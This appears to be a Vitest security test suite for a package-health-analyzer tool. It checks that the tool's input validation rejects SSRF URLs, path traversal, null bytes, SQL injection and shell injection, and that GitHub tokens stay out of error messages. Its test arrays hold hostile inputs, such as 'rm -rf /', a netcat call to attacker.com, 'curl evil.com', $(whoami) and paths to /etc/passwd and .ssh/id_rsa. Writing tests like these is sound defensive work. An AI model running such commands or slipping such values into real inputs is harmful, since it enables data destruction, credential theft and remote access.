/**
 * package-health-analyzer - Security Tests
 *
 * Comprehensive security tests covering:
 * - SSRF (Server-Side Request Forgery) prevention
 * - Path traversal attack prevention
 * - Token/credential security and masking
 *
 * @author 686f6c61 <https://github.com/686f6c61>
 * @repository https://github.com/686f6c61/package-health-analyzer
 * @license MIT
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import { readPackageJson } from '../../src/services/package-reader.js';
import { fetchPackageMetadata } from '../../src/services/npm-registry.js';
import { extractGitHubInfo, fetchGitHubRepo } from '../../src/services/github-api.js';

describe('SSRF Prevention Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('npm-registry.ts', () => {
    it('should reject package names with URL schemes', async () => {
      const maliciousNames = [
        'http://evil.com/package',
        'https://evil.com/package',
        'ftp://evil.com/package',
        'file:///etc/passwd',
      ];

      for (const name of maliciousNames) {
        await expect(fetchPackageMetadata(name)).rejects.toThrow();
      }
    });

    it('should validate package names according to npm rules', async () => {
      // These are technically valid npm package names (though unusual)
      // The SSRF prevention happens at the fetch level, not name validation
      const unusualButValidNames = [
        '10.0.0.1', // Valid as package name (dots allowed)
      ];

      global.fetch = vi.fn().mockResolvedValue({
        ok: false,
        status: 404,
      }) as any;

      for (const name of unusualButValidNames) {
        // Should not throw validation error (may throw 404)
        await expect(fetchPackageMetadata(name)).rejects.toThrow('Package not found');
      }

      // These should be rejected by npm naming rules
      const invalidNames = [
        'package with spaces',
        'UPPERCASE',
        '',
      ];

      for (const name of invalidNames) {
        await expect(fetchPackageMetadata(name)).rejects.toThrow();
      }
    });

    it('should reject package names with special characters', async () => {
      const maliciousNames = [
        '../../../etc/passwd',
        'package@../../evil',
        'package%0a',
        'package\0',
      ];

      for (const name of maliciousNames) {
        await expect(fetchPackageMetadata(name)).rejects.toThrow();
      }
    });

    it('should only allow valid npm package name formats', async () => {
      const validNames = [
        'lodash',
        '@babel/core',
        '@types/node',
        'package-name',
        'package_name',
        'package.name',
      ];

      // Mock fetch to avoid actual network calls
      global.fetch = vi.fn().mockResolvedValue({
        ok: false,
        status: 404,
      }) as any;

      for (const name of validNames) {
        // Should not throw validation error (may throw 404)
        await expect(fetchPackageMetadata(name)).rejects.toThrow('Package not found');
      }
    });
  });

  describe('github-api.ts', () => {
    it('should extract only github.com URLs', () => {
      const validUrls = [
        'https://github.com/user/repo',
        'git+https://github.com/user/repo.git',
        'github:user/repo',
        'git@github.com:user/repo.git',
      ];

      for (const url of validUrls) {
        const result = extractGitHubInfo(url);
        expect(result).toBeTruthy();
        expect(result?.owner).toBeTruthy();
        expect(result?.repo).toBeTruthy();
      }
    });

    it('should reject non-GitHub URLs to prevent SSRF', () => {
      const maliciousUrls = [
        'https://evil.com/repo',
        'https://gitlab.com/user/repo',
        'https://bitbucket.org/user/repo',
        'http://192.168.1.1/repo',
        'file:///etc/passwd',
        'ftp://server.com/file',
      ];

      for (const url of maliciousUrls) {
        const result = extractGitHubInfo(url);
        // Should return null for non-GitHub URLs
        expect(result).toBeNull();
      }
    });

    it('should validate GitHub owner and repo names', async () => {
      const invalidIdentifiers = [
        { owner: '../../../etc', repo: 'passwd' },
        { owner: 'user<script>', repo: 'repo' },
        { owner: 'user@attacker.com', repo: 'repo' },
        { owner: '.', repo: '..' },
      ];

      global.fetch = vi.fn() as any;

      for (const { owner, repo } of invalidIdentifiers) {
        await expect(fetchGitHubRepo(owner, repo)).rejects.toThrow();
      }
    });
  });
});

describe('Path Traversal Prevention Tests', () => {
  describe('package-reader.ts', () => {
    it('should reject obvious path traversal attempts', async () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '../../.ssh/id_rsa',
        '/etc/../../../etc/passwd',
        './../../sensitive',
      ];

      for (const path of maliciousPaths) {
        await expect(readPackageJson(path)).rejects.toThrow();
      }
    });

    it('should reject null byte injection', async () => {
      const maliciousPaths = [
        '/tmp/test\0/etc/passwd',
        'package\0.json',
      ];

      for (const path of maliciousPaths) {
        await expect(readPackageJson(path)).rejects.toThrow('forbidden characters');
      }
    });

    it('should allow absolute paths safely', async () => {
      // This should not throw path traversal error (may throw ENOENT)
      await expect(readPackageJson('/tmp/safe-project')).rejects.toThrow('package.json not found');
    });

    it('should normalize and validate paths', async () => {
      // These should be normalized and validated
      const paths = [
        '/tmp/project',
        '/tmp/project/',
        '/tmp/project/.',
      ];

      for (const path of paths) {
        // Should not throw traversal error (may throw ENOENT)
        await expect(readPackageJson(path)).rejects.toThrow('package.json not found');
      }
    });
  });
});

describe('Token Security Tests', () => {
  describe('GitHub token handling', () => {
    it('should not expose tokens in error messages', async () => {
      const token = 'ghp_secretToken123456789';

      global.fetch = vi.fn().mockResolvedValue({
        ok: false,
        status: 401,
      }) as any;

      try {
        await fetchGitHubRepo('user', 'repo', token);
      } catch (error) {
        const errorMessage = error instanceof Error ? error.message : String(error);
        expect(errorMessage).not.toContain(token);
        expect(errorMessage).not.toContain('ghp_');
      }
    });

    it('should handle missing tokens gracefully', async () => {
      global.fetch = vi.fn().mockResolvedValue({
        ok: true,
        json: async () => ({
          name: 'repo',
          stargazers_count: 100,
          forks_count: 10,
          open_issues_count: 5,
          archived: false,
          pushed_at: '2024-01-01T00:00:00Z',
          created_at: '2020-01-01T00:00:00Z',
        }),
      }) as any;

      // Should not throw when token is undefined
      await expect(fetchGitHubRepo('user', 'repo', undefined)).resolves.toBeTruthy();
    });
  });

  describe('Package name validation (prevent injection)', () => {
    it('should reject shell injection attempts', async () => {
      const injectionAttempts = [
        'package; rm -rf /',
        'package && curl evil.com',
        'package | nc attacker.com 1234',
        'package`whoami`',
        'package$(whoami)',
      ];

      for (const name of injectionAttempts) {
        await expect(fetchPackageMetadata(name)).rejects.toThrow();
      }
    });

    it('should reject SQL injection attempts', async () => {
      const sqlInjection = [
        "package' OR '1'='1",
        'package"; DROP TABLE packages;--',
        "package' UNION SELECT * FROM users--",
      ];

      for (const name of sqlInjection) {
        await expect(fetchPackageMetadata(name)).rejects.toThrow();
      }
    });
  });
});

describe('Input Validation Edge Cases', () => {
  it('should handle empty strings', async () => {
    await expect(fetchPackageMetadata('')).rejects.toThrow();
    await expect(readPackageJson('')).rejects.toThrow();
  });

  it('should handle extremely long inputs', async () => {
    const longName = 'a'.repeat(1000);
    await expect(fetchPackageMetadata(longName)).rejects.toThrow();
  });

  it('should handle unicode and special encodings', async () => {
    const specialNames = [
      'package\u0000',
      'package\uFEFF',
      'package%00',
      'package\r\n',
    ];

    for (const name of specialNames) {
      await expect(fetchPackageMetadata(name)).rejects.toThrow();
    }
  });
});
